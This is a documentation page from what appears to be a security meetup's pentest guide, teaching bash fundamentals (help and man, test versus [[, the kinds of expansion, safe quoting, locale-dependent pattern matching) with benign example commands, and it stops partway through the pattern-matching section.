

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>10.1. bash &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="10.2. Python" href="python.html" />
    <link rel="prev" title="10. Pentest scripting" href="../pentest_scripting.html" /> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a><ul class="current">
<li class="toctree-l2 current"><a class="current reference internal" href="#">10.1. <code class="docutils literal notranslate"><span class="pre">bash</span></code></a><ul>
<li class="toctree-l3"><a class="reference internal" href="#bash-complexity">10.1.1. <code class="docutils literal notranslate"><span class="pre">bash</span></code> complexity</a></li>
<li class="toctree-l3"><a class="reference internal" href="#bash-references">10.1.2. <code class="docutils literal notranslate"><span class="pre">bash</span></code> references</a></li>
<li class="toctree-l3"><a class="reference internal" href="#bash-commands-man-and-help">10.1.3. <code class="docutils literal notranslate"><span class="pre">bash</span></code> commands <code class="docutils literal notranslate"><span class="pre">man</span></code> and <code class="docutils literal notranslate"><span class="pre">help</span></code></a></li>
<li class="toctree-l3"><a class="reference internal" href="#bash-concepts">10.1.4. <code class="docutils literal notranslate"><span class="pre">bash</span></code> concepts</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#expansion">10.1.4.1. Expansion</a></li>
<li class="toctree-l4"><a class="reference internal" href="#arguments-and-quotes">10.1.4.2. Arguments and Quotes</a></li>
<li class="toctree-l4"><a class="reference internal" href="#pattern-matching">10.1.4.3. Pattern Matching</a></li>
<li class="toctree-l4"><a class="reference internal" href="#redirection">10.1.4.4. Redirection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id24">10.1.4.5. What is the difference between test, [ and [[ ?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#functions">10.1.4.6. Functions</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="python.html">10.2. Python</a></li>
<li class="toctree-l2"><a class="reference internal" href="scraping_soup.html">10.3. Scraping with Beautiful Soup</a></li>
<li class="toctree-l2"><a class="reference internal" href="scraping_scrapy.html">10.4. Scraping with Scrapy</a></li>
<li class="toctree-l2"><a class="reference internal" href="internet_data.html">10.5. Internet data</a></li>
<li class="toctree-l2"><a class="reference internal" href="networking.html">10.6. Networking</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_scripting.html">10. Pentest scripting</a> &raquo;</li>
        
      <li>10.1. <code class="docutils literal notranslate"><span class="pre">bash</span></code></li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/scripting/bash.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="bash">
<h1>10.1. <code class="docutils literal notranslate"><span class="pre">bash</span></code><a class="headerlink" href="#bash" title="Permalink to this headline">¶</a></h1>
<div class="section" id="bash-complexity">
<span id="id21"></span><h2>10.1.1. <code class="docutils literal notranslate"><span class="pre">bash</span></code> complexity<a class="headerlink" href="#bash-complexity" title="Permalink to this headline">¶</a></h2>
<p>After completing the rest of this section you can come back and review <a class="reference external" href="http://www.oilshell.org/blog/tags.html?tag=shell-the-bad-parts#shell-the-bad-parts">#shell-the-bad-parts</a>, <a class="reference external" href="http://www.oilshell.org/blog/tags.html?tag=parsing-shell#parsing-shell">#parsing-shell</a>, and <a class="reference external" href="http://www.oilshell.org/blog/tags.html?tag=shell-quoting#shell-quoting">#shell-quoting</a>. <code class="docutils literal notranslate"><span class="pre">bash</span></code> can be quite complicated and tortuous.</p>
<p>But it can be comparatively simple: see <a class="reference external" href="http://www.catb.org/esr/writings/unix-koans/ten-thousand.html">Master Foo and the Ten Thousand Lines</a> from <a class="reference external" href="http://catb.org/esr/writings/unix-koans/">Rootless Root</a>.</p>
</div>
<div class="section" id="bash-references">
<h2>10.1.2. <code class="docutils literal notranslate"><span class="pre">bash</span></code> references<a class="headerlink" href="#bash-references" title="Permalink to this headline">¶</a></h2>
<p>First start with the <a class="reference external" href="https://www.gnu.org/software/bash/manual/">GNU Bash manual</a>. We’ll be referencing the <a class="reference external" href="https://www.gnu.org/software/bash/manual/html_node/index.html">HTML with one web page per node</a>.</p>
<p>Also worth reviewing is <a class="reference external" href="http://mywiki.wooledge.org/EnglishFrontPage">Greg’s Wiki</a> with the following <code class="docutils literal notranslate"><span class="pre">bash</span></code> documentation:</p>
<blockquote>
<div><ul class="simple">
<li><a class="reference external" href="http://mywiki.wooledge.org/BashPitfalls">Bash Pitfalls</a></li>
<li><a class="reference external" href="http://mywiki.wooledge.org/BashGuide">Bash Guide</a></li>
<li><a class="reference external" href="http://mywiki.wooledge.org/BashSheet">Bash Reference Sheet</a></li>
<li><a class="reference external" href="http://mywiki.wooledge.org/BashProgramming">Bash Programming</a></li>
<li><a class="reference external" href="http://mywiki.wooledge.org/BashFAQ">BASH Frequently Asked Questions</a>, including our favorites:<ul>
<li><a class="reference external" href="http://mywiki.wooledge.org/BashFAQ/028">How do I determine the location of my script? I want to read some config files from the same place</a></li>
<li><a class="reference external" href="http://mywiki.wooledge.org/BashFAQ/031">What is the difference between test, [ and [[ ?</a></li>
<li><a class="reference external" href="http://mywiki.wooledge.org/BashFAQ/039">What are all the dot-files that bash reads?</a></li>
</ul>
</li>
</ul>
</div></blockquote>
</div>
<div class="section" id="bash-commands-man-and-help">
<h2>10.1.3. <code class="docutils literal notranslate"><span class="pre">bash</span></code> commands <code class="docutils literal notranslate"><span class="pre">man</span></code> and <code class="docutils literal notranslate"><span class="pre">help</span></code><a class="headerlink" href="#bash-commands-man-and-help" title="Permalink to this headline">¶</a></h2>
<p>From the command line you can get some <code class="docutils literal notranslate"><span class="pre">bash</span></code> help via:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># manual pages</span>
man man
man apropos  <span class="c1"># apropos is short for man -k</span>
man -k passwd  <span class="c1"># keyword search for passwd in man pages</span>
man passwd  <span class="c1"># passwd command</span>
man <span class="m">5</span> passwd  <span class="c1"># passwd file format</span>
man bash

<span class="c1"># &quot;type&quot; classifies &quot;commands&quot; as:</span>
<span class="c1">#     builtin&#39;s = part of shell, but some also have separate executable</span>
<span class="c1">#     keywords (not a command)</span>
<span class="c1">#     separate executable</span>
<span class="c1">#     alias to executable</span>
<span class="c1"># [, test, true, and false are builtin&#39;s and separate executables</span>
<span class="nb">type</span> <span class="s2">&quot;[&quot;</span>
which <span class="s2">&quot;[&quot;</span>
<span class="nb">type</span> /usr/bin/<span class="o">[</span>
<span class="nb">type</span> <span class="nb">test</span>
which <span class="nb">test</span>
<span class="nb">type</span> <span class="nb">true</span>
which <span class="nb">true</span>
<span class="nb">type</span> <span class="nb">false</span>
which <span class="nb">false</span>
<span class="c1"># Proving that [ is treated like an executable file</span>
<span class="nv">I</span><span class="o">=</span><span class="m">3</span><span class="p">;</span> <span class="k">if</span>          <span class="o">[</span> <span class="nv">$I</span> -eq <span class="m">2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> <span class="nv">I</span> <span class="o">=</span> <span class="m">2</span><span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> <span class="nv">I</span> <span class="o">=</span>/<span class="o">=</span> <span class="m">2</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="nb">unset</span> I
<span class="nv">I</span><span class="o">=</span><span class="m">3</span><span class="p">;</span> <span class="k">if</span> /usr/bin/<span class="o">[</span> <span class="nv">$I</span> -eq <span class="m">2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> <span class="nv">I</span> <span class="o">=</span> <span class="m">2</span><span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> <span class="nv">I</span> <span class="o">=</span>/<span class="o">=</span> <span class="m">2</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="nb">unset</span> I
<span class="c1"># [[ is keyword</span>
<span class="nb">type</span> <span class="s2">&quot;[[&quot;</span>
<span class="c1"># executables</span>
<span class="nb">type</span> ls
which ls
<span class="nb">type</span> grep


<span class="c1"># Useful &quot;help&quot; commands</span>
<span class="nb">help</span>  <span class="c1"># list commands built into the shell (not a separate file)</span>

<span class="c1"># Sourcing a file (same process) different than executing file (subprocess)</span>
<span class="nb">help</span> .
<span class="nb">help</span> <span class="nb">source</span>
<span class="c1"># Subprocess gets copy of environment so changes not propagated back</span>
<span class="nb">unset</span> X<span class="p">;</span> <span class="nv">X</span><span class="o">=</span><span class="m">1</span><span class="p">;</span> <span class="o">(</span> <span class="nb">echo</span> <span class="nv">X</span><span class="o">=</span><span class="nv">$X</span><span class="p">;</span> <span class="nv">X</span><span class="o">=</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">X</span><span class="o">=</span><span class="nv">$X</span><span class="p">;</span> <span class="nb">exit</span> <span class="m">255</span><span class="p">;</span> <span class="o">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">RC</span><span class="o">=</span><span class="nv">$?</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">X</span><span class="o">=</span><span class="nv">$X</span><span class="p">;</span> <span class="nb">unset</span> X
<span class="c1"># To group statements without a subshell use {..}</span>
<span class="nb">help</span> <span class="o">{</span>
<span class="nb">unset</span> X<span class="p">;</span> <span class="nv">X</span><span class="o">=</span><span class="m">1</span><span class="p">;</span> <span class="o">{</span> <span class="nb">echo</span> <span class="nv">X</span><span class="o">=</span><span class="nv">$X</span><span class="p">;</span> <span class="nv">X</span><span class="o">=</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">X</span><span class="o">=</span><span class="nv">$X</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">X</span><span class="o">=</span><span class="nv">$X</span><span class="p">;</span> <span class="nb">unset</span> X  <span class="c1"># Don&#39;t exit in {..}</span>

<span class="c1"># Difference between arithmetic value of ((...)) and return code</span>
<span class="nb">help</span> <span class="se">\(</span>
<span class="nb">help</span> <span class="nb">let</span>
<span class="c1"># Return code 0 == true, false o.w. BUT arithmetic value ((0)) is false.</span>
<span class="c1"># So ((0)) value is 0, but RC is 1.</span>
<span class="o">((</span><span class="m">0</span><span class="o">))</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$?</span><span class="p">;</span> <span class="o">((</span><span class="m">1</span><span class="o">))</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$?</span>
<span class="c1"># Comes in handy for testing if string in file:</span>
<span class="o">((</span> <span class="k">$(</span>grep -c root /etc/passwd<span class="k">)</span> <span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&quot;root in /etc/passwd&quot;</span>
<span class="o">((</span> <span class="k">$(</span>grep -c ^^^^ /etc/passwd<span class="k">)</span> <span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&quot;^^^^ in /etc/passwd&quot;</span>


<span class="c1"># Difference between ((..)) and [..], test .., [[..]]</span>
<span class="nb">help</span> <span class="o">[</span>
<span class="nb">help</span> <span class="nb">test</span>
<span class="nb">help</span> <span class="o">[[</span>
<span class="c1"># ((..)) different from rest with numbers</span>
<span class="o">((</span><span class="m">0</span><span class="o">))</span><span class="p">;</span>    <span class="nb">echo</span> <span class="nv">$?</span><span class="p">;</span>   <span class="o">((</span><span class="m">1</span><span class="o">))</span><span class="p">;</span>    <span class="nb">echo</span> <span class="nv">$?</span>
<span class="o">[</span> <span class="m">0</span> <span class="o">]</span><span class="p">;</span>    <span class="nb">echo</span> <span class="nv">$?</span><span class="p">;</span>   <span class="o">[</span> <span class="m">1</span> <span class="o">]</span><span class="p">;</span>    <span class="nb">echo</span> <span class="nv">$?</span>
<span class="nb">test</span> <span class="m">0</span><span class="p">;</span>   <span class="nb">echo</span> <span class="nv">$?</span><span class="p">;</span>   <span class="nb">test</span> <span class="m">1</span><span class="p">;</span>   <span class="nb">echo</span> <span class="nv">$?</span>
<span class="o">[[</span> <span class="m">0</span> <span class="o">]]</span><span class="p">;</span>  <span class="nb">echo</span> <span class="nv">$?</span><span class="p">;</span>   <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span>  <span class="nb">echo</span> <span class="nv">$?</span>
<span class="c1"># ((..)) different from rest with strings</span>
<span class="o">((</span><span class="s2">&quot;&quot;</span><span class="o">))</span><span class="p">;</span>    <span class="nb">echo</span> <span class="nv">$?</span><span class="p">;</span>   <span class="o">((</span><span class="s2">&quot;A&quot;</span><span class="o">))</span><span class="p">;</span>    <span class="nb">echo</span> <span class="nv">$?</span>
<span class="o">[</span> <span class="s2">&quot;&quot;</span> <span class="o">]</span><span class="p">;</span>    <span class="nb">echo</span> <span class="nv">$?</span><span class="p">;</span>   <span class="o">[</span> <span class="s2">&quot;A&quot;</span> <span class="o">]</span><span class="p">;</span>    <span class="nb">echo</span> <span class="nv">$?</span>
<span class="nb">test</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>   <span class="nb">echo</span> <span class="nv">$?</span><span class="p">;</span>   <span class="nb">test</span> <span class="s2">&quot;A&quot;</span><span class="p">;</span>   <span class="nb">echo</span> <span class="nv">$?</span>
<span class="o">[[</span> <span class="s2">&quot;&quot;</span> <span class="o">]]</span><span class="p">;</span>  <span class="nb">echo</span> <span class="nv">$?</span><span class="p">;</span>   <span class="o">[[</span> <span class="s2">&quot;A&quot;</span> <span class="o">]]</span><span class="p">;</span>  <span class="nb">echo</span> <span class="nv">$?</span>


<span class="c1"># eval gets double substitution</span>
<span class="nb">help</span> <span class="nb">eval</span>
<span class="nv">X</span><span class="o">=</span><span class="se">\$</span>Y<span class="p">;</span> <span class="nv">X</span><span class="o">=</span><span class="s1">$&#39;$Y&#39;</span><span class="p">;</span> <span class="nv">Y</span><span class="o">=</span><span class="m">1</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$X</span><span class="p">;</span> <span class="nb">eval</span> <span class="nb">echo</span> <span class="nv">$X</span><span class="p">;</span> <span class="nb">unset</span> X Y


<span class="c1"># true, false only valid in certain contexts</span>
<span class="nb">help</span> :
<span class="nb">help</span> <span class="nb">false</span>
<span class="nb">help</span> <span class="nb">true</span>
<span class="c1"># This works</span>
<span class="k">if</span> true<span class="p">;</span>  <span class="k">then</span> <span class="nb">echo</span> true<span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> false<span class="p">;</span> <span class="k">fi</span>
<span class="k">if</span> false<span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> true<span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> false<span class="p">;</span> <span class="k">fi</span>
<span class="c1"># But these don&#39;t</span>
<span class="k">if</span> <span class="nb">test</span> <span class="nb">true</span>  <span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> true<span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> false<span class="p">;</span> <span class="k">fi</span>
<span class="k">if</span> <span class="nb">test</span> <span class="nb">false</span> <span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> true<span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> false<span class="p">;</span> <span class="k">fi</span>
<span class="k">if</span> <span class="o">[</span> <span class="nb">true</span>    <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> true<span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> false<span class="p">;</span> <span class="k">fi</span>
<span class="k">if</span> <span class="o">[</span> <span class="nb">false</span>   <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> true<span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> false<span class="p">;</span> <span class="k">fi</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nb">true</span>  <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> true<span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> false<span class="p">;</span> <span class="k">fi</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nb">false</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> true<span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> false<span class="p">;</span> <span class="k">fi</span>
<span class="o">[[</span> <span class="nb">true</span>  <span class="o">]]</span> <span class="o">&amp;&amp;</span>  <span class="nb">echo</span> true<span class="p">;</span>
<span class="o">[[</span> <span class="nb">false</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span>  <span class="nb">echo</span> true<span class="p">;</span>


<span class="nb">help</span> <span class="nb">shopt</span>
<span class="nb">help</span> <span class="nb">trap</span>

<span class="nb">help</span> <span class="nb">set</span>
<span class="nb">help</span> <span class="nb">unset</span>
<span class="nb">help</span> <span class="nb">umask</span>
<span class="nb">help</span> <span class="k">function</span>
<span class="nb">help</span> <span class="nb">exit</span>
<span class="nb">help</span> <span class="k">return</span>
<span class="nb">help</span> <span class="nb">shift</span>


<span class="nb">help</span> <span class="nb">printf</span>
<span class="c1"># Trick to repeat strings - format with 0 characters output &quot;%.0s&quot;</span>
<span class="nv">LENGTH100</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span> <span class="s2">&quot;0123456789%.0s&quot;</span> <span class="o">{</span><span class="m">0</span>..9<span class="o">}</span><span class="k">)</span>
<span class="nb">echo</span> <span class="si">${#</span><span class="nv">LENGTH100</span><span class="si">}</span>
<span class="c1"># As seen by ...</span>
<span class="nb">echo</span> <span class="s2">&quot;0123456789%.0s&quot;</span> <span class="o">{</span><span class="m">0</span>..9<span class="o">}</span>
<span class="c1"># The above is short for</span>
<span class="nv">LENGTH100</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span> <span class="s2">&quot;0123456789%.0s&quot;</span> <span class="m">0</span> <span class="m">1</span> <span class="m">2</span> <span class="m">3</span> <span class="m">4</span> <span class="m">5</span> <span class="m">6</span> <span class="m">7</span> <span class="m">8</span> <span class="m">9</span><span class="k">)</span>
<span class="nb">echo</span> <span class="si">${#</span><span class="nv">LENGTH100</span><span class="si">}</span>
<span class="c1"># If the amount output changed to 1</span>
<span class="nv">LENGTH110</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span> <span class="s2">&quot;0123456789%.1s&quot;</span> A B C D E F G H I J<span class="k">)</span>
<span class="nb">echo</span> <span class="si">${#</span><span class="nv">LENGTH110</span><span class="si">}</span>
<span class="nb">unset</span> LENGTH100 LENGTH110


<span class="nb">help</span> variables


<span class="nb">help</span> <span class="k">case</span>
<span class="nb">help</span> <span class="k">if</span>
<span class="nb">help</span> <span class="k">for</span>
<span class="nb">help</span> <span class="k">select</span>
<span class="nb">help</span> <span class="k">until</span>
<span class="nb">help</span> <span class="k">while</span>
<span class="nb">help</span> <span class="nb">break</span>
<span class="nb">help</span> <span class="k">continue</span>
</pre></div>
</div>
</div>
<div class="section" id="bash-concepts">
<h2>10.1.4. <code class="docutils literal notranslate"><span class="pre">bash</span></code> concepts<a class="headerlink" href="#bash-concepts" title="Permalink to this headline">¶</a></h2>
<div class="section" id="expansion">
<h3>10.1.4.1. Expansion<a class="headerlink" href="#expansion" title="Permalink to this headline">¶</a></h3>
<p>From <code class="docutils literal notranslate"><span class="pre">man</span> <span class="pre">bash</span></code>:</p>
<blockquote>
<div><p>Expansion is performed on the command line after it has been split into words. There are seven kinds of expansion performed: brace expansion, tilde expansion, parameter and variable  expansion,  command  substitution, arithmetic expansion, word splitting, and pathname expansion.
…
After these expansions are performed, quote characters present in the original word are removed  unless  they  have  been  quoted  themselves (quote removal).</p>
<p>Only brace expansion, word splitting, and pathname expansion can change the number of words of the expansion; other expansions expand a single word to a single word. The only exceptions to this are the expansions of “$&#64;” and “${name[&#64;]}” as explained above (see PARAMETERS).</p>
</div></blockquote>
<p>Here are some examples of each type of expansion:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># brace expansion</span>
<span class="nb">echo</span> <span class="o">{</span><span class="m">0</span>..9..2<span class="o">}</span>
<span class="nb">echo</span> ls /usr/<span class="o">{</span>bin,share,src<span class="o">}</span>/<span class="o">{</span>gdb,*passwd*<span class="o">}</span>

<span class="c1"># tilde expansion</span>
<span class="nb">echo</span> ls ~
<span class="nb">echo</span> ls ~hacker
<span class="nb">echo</span> ls ~DELETEME

<span class="c1"># parameter expansion</span>
<span class="nv">X</span><span class="o">=</span><span class="s2">&quot;a rather longish string with garbage at end&quot;</span>
<span class="nb">echo</span> <span class="si">${</span><span class="nv">X</span><span class="p">% with garbage*</span><span class="si">}</span>
<span class="nb">unset</span> X

<span class="c1"># command substitution</span>
<span class="nb">echo</span> <span class="nb">echo</span> <span class="k">$(</span>grep -c root /etc/passwd<span class="k">)</span>
<span class="nb">echo</span> <span class="nb">echo</span> <span class="sb">`</span>grep -c root /etc/passwd<span class="sb">`</span>

<span class="c1"># arithmetic expansion</span>
<span class="nb">echo</span> <span class="nb">echo</span> <span class="k">$((</span>  <span class="m">1</span><span class="o">+</span><span class="m">7</span> <span class="o">/</span><span class="m">3</span> <span class="k">))</span>
<span class="nb">echo</span> <span class="nb">echo</span> <span class="k">$((</span> <span class="o">(</span><span class="m">1</span><span class="o">+</span><span class="m">7</span><span class="o">)/</span><span class="m">3</span> <span class="k">))</span>
<span class="nb">echo</span> <span class="nb">echo</span> <span class="k">$((</span> <span class="m">1</span><span class="o">+(</span><span class="m">7</span><span class="o">/</span><span class="m">3</span><span class="o">)</span> <span class="k">))</span>

<span class="c1"># process substitution</span>
<span class="nb">echo</span> grep host &lt;<span class="o">(</span>cat /etc/host*<span class="o">)</span>
<span class="c1"># If you&#39;re confused about what&#39;s going on, run these commands</span>
ls /etc/host*
grep host &lt;<span class="o">(</span>cat /etc/host*<span class="o">)</span>
cat /etc/host*

<span class="c1"># word splitting</span>
count<span class="o">()</span> <span class="o">{</span> <span class="nb">echo</span> <span class="nv">$#</span><span class="p">;</span> <span class="o">}</span>
count a b c
count <span class="s1">&#39;a b c&#39;</span>
<span class="nv">Z</span><span class="o">=</span><span class="s2">&quot;a b c&quot;</span>
count <span class="nv">$Z</span>
count <span class="s2">&quot;</span><span class="nv">$Z</span><span class="s2">&quot;</span>

<span class="c1"># pathname expansion</span>
ls /etc/host*
</pre></div>
</div>
</div>
<div class="section" id="arguments-and-quotes">
<h3>10.1.4.2. Arguments and Quotes<a class="headerlink" href="#arguments-and-quotes" title="Permalink to this headline">¶</a></h3>
<p>For information about how the <code class="docutils literal notranslate"><span class="pre">IFS</span></code> variable affects word splitting see <a class="reference external" href="http://mywiki.wooledge.org/Arguments">Arguments</a>.</p>
<p>See <a class="reference external" href="http://mywiki.wooledge.org/Quotes">Quotes</a> to understand how quoting can affect word splitting. The main takeway for quotes is is to avoid <code class="docutils literal notranslate"><span class="pre">cp</span> <span class="pre">$file</span> <span class="pre">$destination</span>&#160; <span class="pre">#</span> <span class="pre">WRONG</span></code> and use <code class="docutils literal notranslate"><span class="pre">cp</span> <span class="pre">--</span> <span class="pre">&quot;$file&quot;</span> <span class="pre">&quot;$destination&quot;</span>&#160; <span class="pre">#</span> <span class="pre">Right</span></code>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Create file name starting with -- and having an embedded newline</span>
<span class="nv">file</span><span class="o">=</span><span class="s2">&quot;--a</span>
<span class="s2">file&quot;</span>
touch -- <span class="s2">&quot;</span><span class="nv">$file</span><span class="s2">&quot;</span>
ls
ls <span class="p">|</span> xxd
<span class="c1"># Now copy to another unusual but legal filename</span>
<span class="nv">destination</span><span class="o">=</span><span class="s2">&quot;--another file&quot;</span>
cp <span class="nv">$file</span> <span class="nv">$destination</span>         <span class="c1"># WRONG</span>
cp -- <span class="s2">&quot;</span><span class="nv">$file</span><span class="s2">&quot;</span> <span class="s2">&quot;</span><span class="nv">$destination</span><span class="s2">&quot;</span>  <span class="c1"># Right</span>
ls
rm -- --*
ls
</pre></div>
</div>
<p>This Quotes example is important:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Never use an unquoted $@ or $*.</span>
<span class="o">(</span>
<span class="c1"># 3 arguments, not 6</span>
<span class="nb">set</span> <span class="s1">&#39;a&#39;</span> <span class="s1">&#39;b c&#39;</span> <span class="s2">&quot;&#39;d e&#39; f&quot;</span>
<span class="nb">echo</span> <span class="o">============</span>
<span class="c1"># Do this</span>
<span class="k">for</span> file in <span class="s2">&quot;</span><span class="nv">$@</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">do</span>
  <span class="nb">echo</span> <span class="nv">filename</span> <span class="o">=</span> <span class="nv">$file</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="o">============</span>
<span class="c1"># But not this</span>
<span class="k">for</span> file in <span class="s2">&quot;</span><span class="nv">$*</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">do</span>
  <span class="nb">echo</span> <span class="nv">filename</span> <span class="o">=</span> <span class="nv">$file</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="o">============</span>
<span class="c1"># Nor this</span>
<span class="k">for</span> file in <span class="nv">$@</span><span class="p">;</span> <span class="k">do</span>
  <span class="nb">echo</span> <span class="nv">filename</span> <span class="o">=</span> <span class="nv">$file</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="o">============</span>
<span class="c1"># Nor this</span>
<span class="k">for</span> file in <span class="nv">$*</span><span class="p">;</span> <span class="k">do</span>
  <span class="nb">echo</span> <span class="nv">filename</span> <span class="o">=</span> <span class="nv">$file</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="o">============</span>
<span class="o">)</span>
</pre></div>
</div>
</div>
<div class="section" id="pattern-matching">
<h3>10.1.4.3. Pattern Matching<a class="headerlink" href="#pattern-matching" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://www.gnu.org/software/bash/manual/html_node/Pattern-Matching.html#Pattern-Matching">Pattern Matching</a> is more nuanced that it first appears and character ranges are dependent on <code class="docutils literal notranslate"><span class="pre">locale</span></code>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Show your locale first</span>
locale
<span class="c1"># Now display upper/lower case files</span>
touch a A b B c C
ls <span class="o">[</span>a-c<span class="o">]</span>*
ls <span class="o">[</span>A-C<span class="o">]</span>*
ls <span class="o">[</span>a-C<span class="o">]</span>*
